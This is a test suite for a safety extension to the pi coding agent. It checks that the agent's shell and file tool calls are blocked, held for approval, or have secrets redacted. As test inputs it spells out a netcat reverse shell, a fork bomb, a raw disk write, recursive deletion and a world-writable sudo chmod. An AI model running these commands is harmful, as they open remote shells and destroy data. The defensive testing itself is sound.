import { afterAll, describe, expect, mock, setDefaultTimeout, test } from "bun:test"
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs"
import { homedir, tmpdir } from "node:os"
import { join } from "node:path"
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent"
import { piAgentDir, withPiAgentDir } from "@srobroek/opencode-lib/testing"
import { MESSAGES } from "../shared/guards.ts"
import { OP_MESSAGE } from "../shared/op-guard.ts"
import { INVESTIGATE_NOTICE } from "../shared/package-investigate.ts"
import { FORCE_PUSH_MESSAGE, SUDO_MESSAGE } from "../shared/permission.ts"
import { createRedactor } from "../shared/redact.ts"
import { UNKNOWN_DIRECTORY_REMOVAL } from "../shared/worktree-detached.ts"
import { createApprovals, NO_UI_COMMAND, NOTHING_TO_ALLOW, PERMIT_MS } from "./approvals.ts"
import {
  type Asker,
  allowHint,
  createSafetyExtension,
  DECLINED,
  DENIED,
  externalMessage,
  type GateConfig,
  gateBash,
  gateWrite,
  loadPiOptions,
  NO_UI_REFUSAL,
  type PiFeatureID,
  readPiOptions,
  resultPatch,
  STOP,
  settle,
  unresolvedMessage,
  type Verdict,
} from "./safety.ts"
import { SYSTEM_MESSAGES, type SystemGateID } from "./system-gates.ts"

// Real git runs: the file took 2.3 s alone and 11 s beside other suites, so 30 s per test leaves headroom.
setDefaultTimeout(30_000)

const root = realpathSync(mkdtempSync(join(tmpdir(), "safety-pi-")))
afterAll(() => rmSync(root, { recursive: true, force: true }))

const ENV = { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_SYSTEM: "/dev/null" }
function git(cwd: string, ...args: string[]): void {
  const proc = Bun.spawnSync(["git", ...args], { cwd, stdout: "pipe", stderr: "pipe", env: ENV })
  if (proc.exitCode !== 0) throw new Error(`git ${args.join(" ")}: ${proc.stderr.toString()}`)
}

// A repository on main with a shipped migration, an unmerged branch and one stash entry; the tree is clean.
const repo = join(root, "repo")
mkdirSync(join(repo, "migrations"), { recursive: true })
git(root, "init", "-q", "-b", "main", repo)
git(repo, "config", "user.email", "t@example.com")
git(repo, "config", "user.name", "t")
writeFileSync(join(repo, "migrations", "0001_init.sql"), "create table t (id int);\n")
writeFileSync(join(repo, "file.txt"), "one\n")
git(repo, "add", ".")
git(repo, "commit", "-q", "-m", "base")
git(repo, "checkout", "-q", "-b", "local")
git(repo, "commit", "-q", "--allow-empty", "-m", "local work")
git(repo, "checkout", "-q", "main")
writeFileSync(join(repo, "file.txt"), "two\n")
git(repo, "stash", "-q")

const plain = join(root, "plain")
mkdirSync(plain)

/** A fresh agent directory under `root` whose `settings.json` holds `settings`. */
const agentDir = (settings: unknown) => piAgentDir(root, settings)

const config = (raw: unknown = {}, env: NodeJS.ProcessEnv = {}): GateConfig => ({
  options: readPiOptions(raw),
  env,
  review: { gh: async () => "[]", timeoutMs: 20_000, budgetMs: 25_000 },
})

describe("readPiOptions and loadPiOptions", () => {
  test("keeps known feature ids and string opAllow entries, and reads redaction", () => {
    const options = readPiOptions({
      disable: ["attribution", "indirection", "scratch-shell", "nope", 3],
      opAllow: ["vault list", 4],
      redactSecrets: false,
    })
    expect([...options.disabled]).toEqual(["attribution", "indirection"])
    expect(options.opAllow).toEqual(["vault list"])
    expect(options.redact.enabled).toBe(false)
  })

  test("anything but an object is the defaults", () => {
    for (const raw of [null, [], "x", 3]) {
      const options = readPiOptions(raw)
      expect(options.disabled.size).toBe(0)
      expect(options.redact.enabled).toBe(true)
    }
  })

  test("gitWrappers defaults to git and keeps a configured list", () => {
    expect(readPiOptions({}).gitWrappers).toEqual(["git"])
    expect(readPiOptions({ gitWrappers: ["git", "dgit"] }).gitWrappers).toEqual(["git", "dgit"])
  })

  test("worktreeRoots defaults to ~/tmp/worktrees and keeps a configured list, `~` expanded", () => {
    expect(readPiOptions({}).worktreeRoots).toEqual([join(homedir(), "tmp", "worktrees")])
    expect(readPiOptions({ worktreeRoots: ["~/lanes", "/abs", 3] }).worktreeRoots).toEqual([join(homedir(), "lanes"), "/abs"])
  })

  test("approvals defaults to deny and reads ask; any other value is deny", () => {
    expect(readPiOptions({}).approvals).toBe("deny")
    expect(readPiOptions({ approvals: "ask" }).approvals).toBe("ask")
    for (const approvals of ["allow", "ASK", true, 1]) expect(readPiOptions({ approvals }).approvals).toBe("deny")
  })

  test("a missing file or key is the defaults without a warning", () => {
    expect(loadPiOptions(join(root, "missing", "settings.json"))).toEqual({ options: readPiOptions({}) })
    expect(loadPiOptions(join(agentDir({ defaultModel: "m" }), "settings.json"))).toEqual({ options: readPiOptions({}) })
  })

  test("reads the safety key of settings.json", () => {
    const path = join(agentDir({ defaultModel: "m", safety: { disable: ["attribution"], opAllow: ["vault list"] } }), "settings.json")
    const loaded = loadPiOptions(path)
    expect([...loaded.options.disabled]).toEqual(["attribution"])
    expect(loaded.options.opAllow).toEqual(["vault list"])
    expect(loaded.warning).toBeUndefined()
  })

  test("a malformed file or a safety key that is not an object is the defaults with a warning", () => {
    const bad = join(agentDir("{ safety: "), "settings.json")
    const loaded = loadPiOptions(bad)
    expect(loaded.options.disabled.size).toBe(0)
    expect(loaded.warning).toBe(`safety: ${bad} is not valid JSON, so its "safety" key was not read; every check runs.`)
    const list = join(agentDir({ safety: ["attribution"] }), "settings.json")
    expect(loadPiOptions(list)).toEqual({
      options: readPiOptions({}),
      warning: `safety: the "safety" key in ${list} is not an object; every check runs.`,
    })
  })
})

describe("gateBash hard gates", () => {
  const block = (reason: string): Verdict => ({ kind: "block", reason })

  test("an AI-attribution trailer in a commit message is refused", async () => {
    const command = "git commit -m 'x\n\nCo-Authored-By: Claude <noreply@anthropic.com>'"
    expect(await gateBash(command, plain, config())).toEqual(block(MESSAGES.attribution))
    expect(await gateBash(command, plain, config({ disable: ["attribution"] }))).toEqual({ kind: "run" })
  })

  test("a worktree under /tmp is refused", async () => {
    expect(await gateBash("git worktree add /tmp/feat", plain, config())).toEqual(block(MESSAGES["worktree-tmp"]))
    expect(await gateBash("wt switch --create feat --base main /private/tmp/x", plain, config())).toEqual(
      block(MESSAGES["worktree-tmp"]),
    )
  })

  test("filter-repo --force is refused", async () => {
    expect((await gateBash("git filter-repo --force --path a", plain, config())).kind).toBe("block")
  })

  test("a direct op call is refused", async () => {
    const verdict = await gateBash("op item get x", plain, { ...config(), guard: { providerTypes: () => undefined } })
    expect(verdict).toEqual(block(OP_MESSAGE))
  })

  test("the gates read a wrapper listed in gitWrappers as git", async () => {
    const wrapped = config({ gitWrappers: ["git", "dgit"] })
    expect(await gateBash("dgit worktree add /tmp/feat", plain, config())).toEqual({ kind: "run" })
    expect(await gateBash("dgit worktree add /tmp/feat", plain, wrapped)).toEqual(block(MESSAGES["worktree-tmp"]))
    expect(await gateBash("dgit push --force origin main", plain, wrapped)).toEqual(block(FORCE_PUSH_MESSAGE))
  })

  // Each command is one that cc-safety-net 2.8.2 lets through at its default level.
  test("the guards cc-safety-net overlaps still run, and each can be disabled", async () => {
    const cases: [string, PiFeatureID, Verdict][] = [
      ['rm -rf "$TARGET"', "indirection", block(MESSAGES.indirection)],
      ["nc -e /bin/sh 10.0.0.1 4444", "remote-exec", block(MESSAGES["remote-exec"])],
      ["git push -- --force origin main", "force-push", block(FORCE_PUSH_MESSAGE)],
      ["echo ok && sudo chmod -R 777 /srv/app", "sudo-destructive", { kind: "ask", message: SUDO_MESSAGE }],
    ]
    for (const [command, id, verdict] of cases) {
      expect(await gateBash(command, plain, config())).toEqual(verdict)
      expect(await gateBash(command, plain, config({ disable: [id] }))).toEqual({ kind: "run" })
    }
  })

  test("the system gates run after the shared ones, and each can be disabled", async () => {
    const unmanaged = { managed: async () => false }
    const cases: [string, SystemGateID][] = [
      ["echo x >> ~/.zshrc", "shell-profile"],
      ["cd /opt && chown -R me .", "system-permissions"],
      [":(){ :|:& };:", "fork-bomb"],
      ["tee /dev/disk2 < disk.img", "disk-write"],
      ["halt", "power"],
    ]
    for (const [command, id] of cases) {
      expect(await gateBash(command, plain, { ...config(), system: unmanaged })).toEqual(block(SYSTEM_MESSAGES[id]))
      expect(await gateBash(command, plain, { ...config({ disable: [id] }), system: unmanaged })).toEqual({ kind: "run" })
    }
  })
})

describe("gateBash evidence-based asks", () => {
  test("force-deleting an unmerged branch asks", async () => {
    const verdict = await gateBash("git branch -D local", repo, config())
    expect(verdict.kind).toBe("ask")
    expect(verdict.kind === "ask" && verdict.message).toContain("worktree-destruction-guard")
  })

  test("dropping a stash asks with its restore command; a clean reset to HEAD passes", async () => {
    const drop = await gateBash("git stash drop", repo, config())
    expect(drop.kind === "ask" && drop.message).toContain("git stash store -m restored")
    expect(await gateBash("git reset --hard", repo, config())).toEqual({ kind: "run" })
    expect(await gateBash("git stash drop", repo, config({ disable: ["worktree-destruction"] }))).toEqual({ kind: "run" })
  })

  test("a flag directory outside the session asks", async () => {
    const verdict = await gateBash("git -C /elsewhere/repo status", plain, config())
    expect(verdict).toEqual({ kind: "ask", message: externalMessage([{ resource: "/elsewhere/repo/*", save: "/elsewhere/repo/*" }]) })
    expect(await gateBash(`git -C ${plain} status`, plain, config())).toEqual({ kind: "run" })
  })

  test("after a leading cd it cannot read, only the checks that need its directory change their verdict", async () => {
    for (const command of ["cd .. && ls", "cd ~/x && git status", 'cd "$(git rev-parse --show-toplevel)" && bun test']) {
      expect({ command, verdict: await gateBash(command, plain, config()) }).toEqual({ command, verdict: { kind: "run" } })
    }
    expect(await gateBash('cd "$X" && git -C sub status', plain, config())).toEqual({ kind: "ask", message: unresolvedMessage(["sub"]) })
    expect(await gateBash('cd "$X" && git -C /elsewhere/repo status', plain, config())).toEqual({
      kind: "ask",
      message: externalMessage([{ resource: "/elsewhere/repo/*", save: "/elsewhere/repo/*" }]),
    })
    expect(await gateBash(`cd ${repo} && git -C migrations status`, plain, config())).toEqual({
      kind: "ask",
      message: externalMessage([{ resource: `${repo}/migrations/*`, save: `${repo}/*` }]),
    })
    expect(await gateBash('cd "$X" && git worktree remove wt', repo, config())).toEqual({ kind: "block", reason: UNKNOWN_DIRECTORY_REMOVAL })
    const deleted = await gateBash('cd "$X" && git branch -D local', repo, config())
    expect(deleted.kind).not.toBe("run")
    const rewrite = await gateBash('cd "$X" && git filter-branch --env-filter true', repo, config())
    expect(rewrite.kind).toBe("block")
  })
})

describe("gateBash directory flags in the session repository's worktrees", () => {
  // The reported layout: a main checkout, its linked worktrees in another folder, and a second spelling of the
  // folder that holds both (`/home/u` linking to `/local/home/u`).
  const main = join(root, "fc", "main")
  const sink = join(root, "worktrees", "sink")
  const lane = join(root, "worktrees", "lane")
  const alias = join(root, "home-alias")
  const outside = join(root, "outside-target")
  mkdirSync(main, { recursive: true })
  git(main, "init", "-q", "-b", "main")
  git(main, "-c", "user.email=t@example.com", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "base")
  git(main, "worktree", "add", "-q", "-b", "sink", sink)
  git(main, "worktree", "add", "-q", "-b", "lane", lane)
  mkdirSync(join(sink, "infra"))
  mkdirSync(outside)
  symlinkSync(root, alias)
  // In `lane`, `infra` leads out of every root.
  symlinkSync(outside, join(lane, "infra"))
  const reported = (dir: string) =>
    `cd ${dir}; timeout 300 bun install --cwd infra --frozen-lockfile 2>&1 | tail -2; cd infra && timeout 600 bun run test -- test/build-commit.test.ts 2>&1 | tail -25`

  test("the reported command, from the main checkout into a linked worktree, runs", async () => {
    expect(await gateBash(reported(sink), main, config())).toEqual({ kind: "run" })
  })

  test("from a linked worktree into the main checkout, and through another spelling of the folder, it runs", async () => {
    expect(await gateBash(reported(main), sink, config())).toEqual({ kind: "run" })
    const spelled = join(alias, "worktrees", "sink")
    expect(await gateBash(reported(spelled), main, config())).toEqual({ kind: "run" })
    expect(await gateBash(`cd ${spelled} && bun install --cwd infra`, main, config())).toEqual({ kind: "run" })
  })

  test("after `cd <dir>;` the session directory is a base too, so a flag directory a failed cd leaves outside asks", async () => {
    expect(await gateBash(`cd ${sink}; bun install --cwd infra`, lane, config())).toEqual({
      kind: "ask",
      message: externalMessage([{ resource: `${lane}/infra/*`, save: `${lane}/*` }]),
    })
    expect(await gateBash(`cd ${sink} && bun install --cwd infra`, lane, config())).toEqual({ kind: "run" })
  })

  test("a cd outside the repository and its worktrees still asks; an unreadable one stays unresolved", async () => {
    expect(await gateBash(`cd ${repo}; bun install --cwd x`, main, config())).toEqual({
      kind: "ask",
      message: externalMessage([{ resource: `${repo}/x/*`, save: `${repo}/*` }]),
    })
    expect(await gateBash('cd "$X"; bun install --cwd x', main, config())).toEqual({ kind: "ask", message: unresolvedMessage(["x"]) })
  })

  test("a later directory change leaves the flag directories after it unresolved", async () => {
    for (const command of [
      `cd ${sink}; cd ${outside}; git -C infra status`,
      `cd ${sink}; pushd ${outside}; bun install --cwd infra`,
      `cd ${sink}; (cd ${outside} && bun install --cwd infra)`,
      `cd ${sink} && cd ${outside} && git -C infra status`,
    ]) {
      expect({ command, verdict: await gateBash(command, main, config()) }).toEqual({
        command,
        verdict: { kind: "ask", message: unresolvedMessage(["infra"]) },
      })
    }
    expect(await gateBash(`cd ${sink}; git -C infra status; cd ${outside}`, main, config())).toEqual({ kind: "run" })
  })

  test("worktreeRoots takes a linked worktree of another repository under a root as inside", async () => {
    const other = join(root, "other-repo")
    const rooted = join(root, "rooted")
    mkdirSync(other)
    git(other, "init", "-q", "-b", "main")
    git(other, "-c", "user.email=t@example.com", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "base")
    git(other, "worktree", "add", "-q", "-b", "lane", join(rooted, "lane"))
    mkdirSync(join(rooted, "plain"))
    const into = (dir: string) => `cd ${dir}; bun install --cwd infra`
    expect(await gateBash(into(join(rooted, "lane")), main, config({ worktreeRoots: [rooted] }))).toEqual({ kind: "run" })
    expect(await gateBash(into(join(rooted, "lane")), main, config())).toEqual({
      kind: "ask",
      message: externalMessage([{ resource: `${rooted}/lane/infra/*`, save: `${rooted}/lane/*` }]),
    })
    expect(await gateBash(into(join(rooted, "plain")), main, config({ worktreeRoots: [rooted] }))).toEqual({
      kind: "ask",
      message: externalMessage([{ resource: `${rooted}/plain/infra/*`, save: `${rooted}/plain/infra/*` }]),
    })
  })
})

describe("shipped migrations", () => {
  test("an edit, a write or a shell append to a shipped migration is refused", async () => {
    for (const tool of ["edit", "write"]) {
      const verdict = await gateWrite(tool, { path: "migrations/0001_init.sql" }, repo, config())
      expect(verdict.kind === "block" && verdict.reason).toContain("Blocked by safety (migration-edit)")
    }
    const shell = await gateBash("echo 'alter table t add c int;' >> migrations/0001_init.sql", repo, config())
    expect(shell.kind === "block" && shell.reason).toContain("Blocked by safety (migration-edit)")
  })

  test("the escape hatch and disable let it through; a new migration is never refused", async () => {
    const path = { path: "migrations/0001_init.sql" }
    expect(await gateWrite("edit", path, repo, config({}, { SAFETY_ALLOW_MIGRATION_EDIT: "1" }))).toEqual({ kind: "run" })
    expect(await gateWrite("edit", path, repo, config({ disable: ["migration-edit"] }))).toEqual({ kind: "run" })
    expect(await gateWrite("write", { path: "migrations/0002_next.sql" }, repo, config())).toEqual({ kind: "run" })
  })
})

/** The refusal ID in a `deny`-mode refusal. */
function refusalId(result: unknown): string {
  const id = (result as { reason?: string } | undefined)?.reason?.match(/^Refusal ([a-z2-7]{4}): command, in /m)?.[1]
  if (id === undefined) throw new Error(`no refusal ID in ${JSON.stringify(result)}`)
  return id
}

describe("settle", () => {
  const asker = (answer: boolean, hasUI = true) => {
    const confirm = mock(async (_title: string, _message: string) => answer)
    return { asker: { hasUI, ui: { confirm } } satisfies Asker, confirm }
  }
  const ui = asker(true).asker
  const call = { command: "git stash drop", cwd: "/work" }
  const other = { command: "git clean -fd", cwd: "/work" }
  const ask: Verdict = { kind: "ask", message: "safety (worktree-destruction-guard): why" }
  const block: Verdict = { kind: "block", reason: "no" }
  const denial = (id: string, at = call) => ({
    block: true,
    reason: [DENIED, `Refusal ${id}: command, in ${at.cwd}:\n${at.command}`, ask.message, allowHint(id)].join("\n\n"),
  })
  const refused = async (approvals: ReturnType<typeof createApprovals>, at = call) => {
    const result = await settle(ask, ui, approvals, at)
    const id = refusalId(result)
    expect(result).toEqual(denial(id, at))
    return id
  }

  test("run passes and block refuses with the reason", async () => {
    const approvals = createApprovals("deny")
    expect(await settle({ kind: "run" }, ui, approvals, call)).toBeUndefined()
    expect(await settle(block, ui, approvals, call)).toEqual({ block: true, reason: "no" })
  })

  test("deny, the default, refuses an ask without a dialog under an ID, naming the rule, the command, the cwd and /safety allow <id>", async () => {
    const quiet = asker(true)
    const result = await settle(ask, quiet.asker, createApprovals(readPiOptions({}).approvals), call)
    const id = refusalId(result)
    expect(id).toMatch(/^[a-z2-7]{4}$/)
    expect(result).toEqual(denial(id))
    expect((result as { reason: string }).reason).toContain(`\`/safety allow ${id}\``)
    expect(quiet.confirm).not.toHaveBeenCalled()
    // A file tool's call is no command, so nothing can allow it.
    expect(await settle(ask, quiet.asker, createApprovals("deny"))).toEqual({ block: true, reason: [DENIED, ask.message, STOP].join("\n\n") })
  })

  test("/safety ask restores the dialog for the session, and /safety deny switches back", async () => {
    const approvals = createApprovals("deny")
    expect(approvals.command("ask", true).level).toBe("info")
    const yes = asker(true)
    expect(await settle(ask, yes.asker, approvals, call)).toBeUndefined()
    expect(yes.confirm.mock.calls[0]?.[1]).toBe(ask.message)
    const declined = [DECLINED, `Command, in /work:\ngit stash drop`, ask.message].join("\n\n")
    expect(await settle(ask, asker(false).asker, approvals, call)).toEqual({ block: true, reason: declined })
    approvals.command("deny", true)
    await refused(approvals)
    expect(yes.confirm).toHaveBeenCalledTimes(1)
  })

  test("of two refusals, allowing the first ID permits only its command, in its cwd, once", async () => {
    const approvals = createApprovals("deny")
    const first = await refused(approvals)
    const second = await refused(approvals, other)
    expect(second).not.toBe(first)
    expect(approvals.command(`allow ${first}`, true)).toEqual({ text: `safety: allowing ${first} once, within 30 minutes, in /work:\ngit stash drop`, level: "info" })
    // A pending refusal of the same call keeps its ID.
    expect(await refused(approvals, other)).toBe(second)
    const moved = { ...call, cwd: "/elsewhere" }
    expect(await refused(approvals, moved)).not.toBe(first)
    expect(await settle(ask, ui, approvals, call)).toBeUndefined()
    expect(await refused(approvals)).not.toBe(first)
  })

  test("an unknown, spent or expired ID is rejected, and a permit ends after 30 minutes or at session end", async () => {
    let now = 0
    const approvals = createApprovals("deny", () => now)
    expect(approvals.command("allow zzzz", true)).toEqual({ text: "safety: no refusal zzzz in this session; /safety allow lists them.", level: "error" })
    const spent = await refused(approvals)
    approvals.command(`allow ${spent}`, true)
    expect(await settle(ask, ui, approvals, call)).toBeUndefined()
    expect(approvals.command(`allow ${spent}`, true)).toEqual({ text: `safety: refusal ${spent} was allowed once already, and its command ran.`, level: "error" })
    const stale = await refused(approvals)
    now += PERMIT_MS
    const expired = { text: `safety: refusal ${stale} expired after 30 minutes; let the agent run the command again for a new ID.`, level: "error" as const }
    expect(approvals.command(`allow ${stale}`, true)).toEqual(expired)
    const late = await refused(approvals)
    approvals.command(`allow ${late}`, true)
    now += PERMIT_MS
    await refused(approvals)
    const ended = await refused(approvals, other)
    approvals.command(`allow ${ended}`, true)
    approvals.reset()
    await refused(approvals, other)
    expect(approvals.command(`allow ${ended}`, true).level).toBe("error")
  })

  test("bare /safety allow lists the pending refusals and grants nothing", async () => {
    const approvals = createApprovals("deny")
    expect(approvals.command("allow", true)).toEqual({ text: NOTHING_TO_ALLOW, level: "warning" })
    const first = await refused(approvals)
    const second = await refused(approvals, other)
    expect(approvals.command(" allow ", true)).toEqual({
      text: [
        "safety: refused commands; /safety allow <id> permits one once:",
        `${first}, refused under a minute ago, in /work:\ngit stash drop`,
        `${second}, refused under a minute ago, in /work:\ngit clean -fd`,
      ].join("\n"),
      level: "info",
    })
    expect(await refused(approvals)).toBe(first)
    expect(await refused(approvals, other)).toBe(second)
  })

  test("a block stays a block: ask mode opens no dialog, and a permit for the same command does not pass it", async () => {
    const yes = asker(true)
    expect(await settle(block, yes.asker, createApprovals("ask"), call)).toEqual({ block: true, reason: "no" })
    expect(yes.confirm).not.toHaveBeenCalled()
    const approvals = createApprovals("deny")
    approvals.command(`allow ${await refused(approvals)}`, true)
    expect(await settle(block, ui, approvals, call)).toEqual({ block: true, reason: "no" })
    // The blocked call spent the permit.
    await refused(approvals)
  })

  test("a session without a UI, such as a subagent child, refuses every ask in either mode, and /safety changes nothing there", async () => {
    const noUI = { block: true, reason: [NO_UI_REFUSAL, `Command, in /work:\ngit stash drop`, ask.message].join("\n\n") }
    for (const mode of ["deny", "ask"] as const) {
      const approvals = createApprovals(mode)
      const none = asker(true, false)
      expect(await settle(ask, none.asker, approvals, call)).toEqual(noUI)
      for (const args of ["allow", "allow abcd", "ask", "deny"]) expect(approvals.command(args, false)).toEqual({ text: NO_UI_COMMAND, level: "error" })
      expect(approvals.mode).toBe(mode)
      expect(await settle(ask, none.asker, approvals, call)).toEqual(noUI)
      expect(none.confirm).not.toHaveBeenCalled()
    }
  })
})

describe("resultPatch", () => {
  const SECRET = "sk-dummy-0123456789abcdef"
  const redactor = () => createRedactor(() => ({ DEMO_API_KEY: SECRET }))

  test("appends the notice and keeps the structured content", () => {
    const event = { content: [{ type: "text" as const, text: "ok" }], details: undefined, structuredContent: { output: "ok" } }
    expect(resultPatch(event, "note", undefined)).toEqual({
      content: [
        { type: "text", text: "ok" },
        { type: "text", text: "note" },
      ],
      structuredContent: { output: "ok" },
    })
  })

  test("redacts content, details and structured content", () => {
    const event = {
      content: [{ type: "text" as const, text: `key=${SECRET}` }],
      details: { fullOutputPath: "/x", echo: SECRET },
      structuredContent: { output: SECRET },
    }
    expect(resultPatch(event, undefined, redactor())).toEqual({
      content: [{ type: "text", text: "key=[REDACTED:DEMO_API_KEY]" }],
      details: { fullOutputPath: "/x", echo: "[REDACTED:DEMO_API_KEY]" },
      structuredContent: { output: "[REDACTED:DEMO_API_KEY]" },
    })
  })

  test("a clean result is left alone", () => {
    const event = { content: [{ type: "text" as const, text: "ok" }], details: undefined, structuredContent: undefined }
    expect(resultPatch(event, undefined, redactor())).toBeUndefined()
  })
})

type Handler = (event: unknown, ctx: unknown) => unknown
type Tool = { name: string; parameters: unknown; execute: (...args: unknown[]) => Promise<unknown> }
type Command = { handler: (args: string, ctx: unknown) => Promise<void>; getArgumentCompletions?: (prefix: string) => unknown }

/** One extension instance, as pi builds for each session; pass `extension` to build several from one module. */
function load(overrides: Parameters<typeof createSafetyExtension>[0] = {}, extension = createSafetyExtension({ settingsPath: join(root, "missing", "settings.json"), env: {}, ...overrides })) {
  const handlers = new Map<string, Handler[]>()
  const tools = new Map<string, Tool>()
  const commands = new Map<string, Command>()
  const pi = {
    on: (event: string, handler: Handler) => handlers.set(event, [...(handlers.get(event) ?? []), handler]),
    registerTool: (tool: Tool) => tools.set(tool.name, tool),
    registerCommand: (name: string, command: Command) => commands.set(name, command),
  }
  extension(pi as unknown as ExtensionAPI)
  const fire = async (event: string, payload: unknown, ctx: unknown) => {
    let result: unknown
    for (const handler of handlers.get(event) ?? []) result = await handler(payload, ctx)
    return result
  }
  const run = (args: string, ctx: unknown) => (commands.get("safety") as Command).handler(args, ctx)
  return { handlers, tools, commands, fire, run }
}

function context(hasUI: boolean, cwd = plain) {
  const notify = mock((_message: string, _type?: string) => {})
  const confirm = mock(async () => true)
  return { cwd, hasUI, ui: { notify, confirm }, sessionManager: { getSessionId: () => "s1" } }
}

describe("the extension", () => {
  test("tool_call refuses an attributed commit", async () => {
    const { fire } = load()
    const event = { type: "tool_call", toolCallId: "1", toolName: "bash", input: { command: "git commit -m 'x\n\nCo-Authored-By: Claude'" } }
    expect(await fire("tool_call", event, context(true))).toEqual({ block: true, reason: MESSAGES.attribution })
  })

  test("tool_call rewrites close keywords in place and lets the PR through", async () => {
    const { fire } = load()
    const event = { type: "tool_call", toolCallId: "2", toolName: "bash", input: { command: "gh pr create --title t --body 'Fixes #1, #2'" } }
    expect(await fire("tool_call", event, context(true))).toBeUndefined()
    expect(event.input.command).toBe("gh pr create --title t --body 'Fixes #1, fixes #2'")
  })

  test("tool_call refuses an edit of a shipped migration and ignores reads", async () => {
    const { fire } = load()
    const edit = { type: "tool_call", toolCallId: "3", toolName: "edit", input: { path: "migrations/0001_init.sql", edits: [] } }
    const refused = (await fire("tool_call", edit, context(true, repo))) as { block: boolean; reason: string }
    expect(refused.reason).toContain("migration-edit")
    const read = { type: "tool_call", toolCallId: "4", toolName: "read", input: { path: "migrations/0001_init.sql" } }
    expect(await fire("tool_call", read, context(true, repo))).toBeUndefined()
  })

  test("tool_result adds the vetting notice once per package and redacts secrets", async () => {
    const SECRET = "tvly-dummy-0123456789abcdef"
    const { fire } = load({ env: { TAVILY_API_KEY: SECRET } })
    const result = (text: string, isError = false) => ({
      type: "tool_result",
      toolCallId: "5",
      toolName: "bash",
      input: { command: "bun add left-pad" },
      content: [{ type: "text", text }],
      details: undefined,
      isError,
    })
    const first = (await fire("tool_result", result(`key ${SECRET}`), context(true))) as { content: { text: string }[] }
    expect(first.content.map((part) => part.text)).toEqual([
      "key [REDACTED:TAVILY_API_KEY]",
      `${INVESTIGATE_NOTICE} Packages: left-pad.`,
    ])
    expect(await fire("tool_result", result("installed"), context(true))).toBeUndefined()
  })

  test("a safety key that is not an object warns at session start", async () => {
    const settingsPath = join(agentDir({ safety: "off" }), "settings.json")
    const { fire } = load({ settingsPath })
    const ctx = context(true)
    await fire("session_start", { type: "session_start" }, ctx)
    expect(ctx.ui.notify.mock.calls[0]?.[0]).toBe(`safety: the "safety" key in ${settingsPath} is not an object; every check runs.`)
  })

  test("reads <agentDir>/settings.json alone: a stale safety.json and a project's .pi/settings.json are ignored", async () => {
    const attributed = { type: "tool_call", toolCallId: "6", toolName: "bash", input: { command: "git commit -m 'x\n\nCo-Authored-By: Claude'" } }
    const project = join(root, "project")
    mkdirSync(join(project, ".pi"), { recursive: true })
    writeFileSync(join(project, ".pi", "settings.json"), JSON.stringify({ safety: { disable: ["attribution"] } }))
    const fromDefault = (dir: string) => withPiAgentDir(dir, () => load({ settingsPath: undefined }))
    const keyed = fromDefault(agentDir({ safety: { disable: ["attribution"] } }))
    expect(await keyed.fire("tool_call", attributed, context(true))).toBeUndefined()
    const stale = agentDir({ defaultModel: "m" })
    writeFileSync(join(stale, "safety.json"), JSON.stringify({ disable: ["attribution"] }))
    const unkeyed = fromDefault(stale)
    expect(await unkeyed.fire("tool_call", attributed, context(true, project))).toEqual({ block: true, reason: MESSAGES.attribution })
  })

  test("registers no tool: the secret-store plugin ships safety_secret_store", () => {
    expect(load().tools.size).toBe(0)
  })

  const bash = (command: string) => ({ type: "tool_call", toolCallId: "7", toolName: "bash", input: { command } })

  test("an ask-rule command is refused without a dialog; /safety allow <id> lets that command run once", async () => {
    const { fire, run } = load()
    const ctx = context(true, repo)
    const refusal = await fire("tool_call", bash("git stash drop"), ctx)
    const id = refusalId(refusal)
    const { reason } = refusal as { reason: string }
    expect(reason.startsWith(`${DENIED}\n\nRefusal ${id}: command, in ${repo}:\ngit stash drop\n\nsafety (worktree-destruction-guard)`)).toBe(true)
    expect(reason.endsWith(allowHint(id))).toBe(true)
    expect(ctx.ui.confirm).not.toHaveBeenCalled()
    await run("allow", ctx)
    expect(ctx.ui.notify.mock.calls.at(-1)?.[0]).toContain(`${id}, refused under a minute ago, in ${repo}:\ngit stash drop`)
    expect(await fire("tool_call", bash("git stash drop"), ctx)).toEqual(refusal)
    await run(`allow ${id}`, ctx)
    expect(ctx.ui.notify.mock.calls.at(-1)).toEqual([`safety: allowing ${id} once, within 30 minutes, in ${repo}:\ngit stash drop`, "info"])
    expect(await fire("tool_call", bash("git stash drop"), ctx)).toBeUndefined()
    expect(refusalId(await fire("tool_call", bash("git stash drop"), ctx))).not.toBe(id)
  })

  test("approvals: ask in settings opens the dialog; /safety deny refuses for the rest of the session", async () => {
    const { fire, run } = load({ settingsPath: join(agentDir({ safety: { approvals: "ask" } }), "settings.json") })
    const ctx = context(true, repo)
    expect(await fire("tool_call", bash("git stash drop"), ctx)).toBeUndefined()
    expect(ctx.ui.confirm).toHaveBeenCalledTimes(1)
    await run("deny", ctx)
    refusalId(await fire("tool_call", bash("git stash drop"), ctx))
    expect(ctx.ui.confirm).toHaveBeenCalledTimes(1)
  })

  test("a subagent child refuses with no ID, cannot allow, and gets no permit from its parent", async () => {
    const extension = createSafetyExtension({ settingsPath: join(agentDir({ safety: { approvals: "ask" } }), "settings.json"), env: {} })
    const parent = load({}, extension)
    const child = load({}, extension)
    const lead = context(true, repo)
    await parent.run("deny", lead)
    const id = refusalId(await parent.fire("tool_call", bash("git stash drop"), lead))
    await parent.run(`allow ${id}`, lead)
    const sub = context(false, repo)
    await child.run(`allow ${id}`, sub)
    const refusal = (await child.fire("tool_call", bash("git stash drop"), sub)) as { reason: string }
    expect(refusal.reason.startsWith(`${NO_UI_REFUSAL}\n\nCommand, in ${repo}:\ngit stash drop`)).toBe(true)
    expect(sub.ui.notify).not.toHaveBeenCalled()
    expect(sub.ui.confirm).not.toHaveBeenCalled()
    expect(await parent.fire("tool_call", bash("git stash drop"), lead)).toBeUndefined()
  })

  test("registers /safety with ask, deny and allow completions; a session end drops its permits", async () => {
    const { commands, fire, run } = load()
    expect(commands.get("safety")?.getArgumentCompletions?.("a")).toEqual([
      { value: "ask", label: "ask" },
      { value: "allow", label: "allow" },
    ])
    const ctx = context(true, repo)
    const id = refusalId(await fire("tool_call", bash("git stash drop"), ctx))
    await run(`allow ${id}`, ctx)
    await fire("session_shutdown", { type: "session_shutdown", reason: "quit" }, ctx)
    refusalId(await fire("tool_call", bash("git stash drop"), ctx))
  })
})
